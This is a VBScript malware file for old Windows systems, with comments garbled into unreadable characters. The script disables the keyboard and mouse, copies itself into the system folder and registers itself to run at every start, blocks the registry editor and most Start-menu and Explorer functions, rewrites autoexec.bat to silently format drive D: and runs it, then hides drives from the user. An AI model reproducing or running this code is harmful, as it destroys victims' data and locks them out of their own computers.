'            = = = = = =  = > ��� ������ < = = = = = = = 

'      ���������� ����������(���� ����� �� ����������)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' ���������� ������
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


'     �������� ����������(������ ��� Windows 95,98,Me)
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Dead", "rundll32 keyboard,disable"
Shell.Run "rundll32.exe keyboard.exe, disable"

'     ��������� ����(������ ��� Windows 95,98,Me)
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Mad", "rundll32 mouse,disable"
Shell.Run "rundll32.exe mouse.exe, disable"

' �������������� ��� ����
Application.MinimizeAll

' ����������� ��� ������ ������������
Set File2 = FileSystemObject.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

' ����������� RegEdit(���� � ���� �� ��������� �������� �������).��� ���� ����� �������������� ���������� DisableRegistryTools �������� - 0
Shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"

' �������� ������� ���� ����: ���������, ���������� ������, �����, ���������, ��������� � �.�.
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoStartMenuMorePrograms", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoClose", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoFind", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoRun", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoRecentDocsMenu", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoFavoritesMenu", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoStartMenuLogoff", 1, "REG_DWORD"

'     ������������� D (������ ��� Windows 95,98,Me)
If FileSystemObject.FileExists("d:\autoexec.bat") Then Str  = "d:\autoexec.bat"
If FileSystemObject.FileExists("d:\Windows.000\autoexec.bat") Then Str  = "d:\Windows.000\autoexec.bat"
If FileSystemObject.FileExists("d:\Windows\autoexec.bat") Then Str  = "d:\Windows\autoexec.bat"
If FileSystemObject.FileExists("c:\autoexec.bat") Then Str = "c:\autoexec.bat"
If FileSystemObject.FileExists("c:\Windows.000\autoexec.bat") Then Str = "c:\Windows.000\autoexec.bat"
If FileSystemObject.FileExists("c:\Windows\autoexec.bat") Then Str = "c:\Windows\autoexec.bat"
Set ab = FileSystemObject.GetFile(Str)
ab.Attributes = 0
Set autoexec = FileSystemObject.CreateTextFile(Str)
autoexec.WriteLine "@cls"
autoexec.WriteLine "@format D: /q /autotest"
autoexec.Close
Shell.Run Str, 5
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 8, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive", 8, "REG_DWORD"

